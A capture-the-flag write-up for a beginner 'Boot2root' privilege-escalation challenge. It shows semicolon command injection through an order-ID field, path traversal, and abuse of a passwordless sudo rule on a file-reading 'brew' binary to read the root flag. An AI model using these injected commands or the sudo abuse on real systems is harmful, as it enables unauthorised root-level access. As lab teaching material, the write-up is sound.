# Description
```
 Boot2root

Difficulty: Beginner
Author: Quack

Now that you have access to their system, is there any way you can escalate your privileges and read the final flag?

The root flag is located in /root/root.txt.

Note: This challenge requires you have solved Caffeine (User).

```
# Attachments
<img width="1856" height="1515" alt="image" src="https://github.com/user-attachments/assets/199452a9-27cb-404f-83d2-088fd49063ef" />

# Solution
Just like in Caffeine (User) problem, we test other commands. \
The description suggests us to use sudo commands. \
We check which sudo commands are available by typing:
```shell
; sudo -l
```
This displays the result:
```
Matching Defaults entries for www-data on ctf-caffeine-user-5be946dd5cca5dd4-7db9f4547d-gs94q:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ctf-caffeine-user-5be946dd5cca5dd4-7db9f4547d-gs94q:
    (ALL) NOPASSWD: /usr/local/bin/brew
```

We go to this folder and run brew. This displays a message:
```
Order Status for #;../../../usr/local/bin/brew;

   ( (
    ) )
   ( (
  .-'-.
  |•.•|  
  |   |  
  '~~~'  
   JavaJack's Regular Brew

  Usage: brew [file]
  Reads files with coffee-powered vision

No order found with ID #;../../../usr/local/bin/brew; 
```

This suggests that we can read /root/root.txt using sudo brew. \
Navigate to /root and read it.
```
;../../../usr/local/bin/brew; sudo brew ../../../root/root.txt;
```
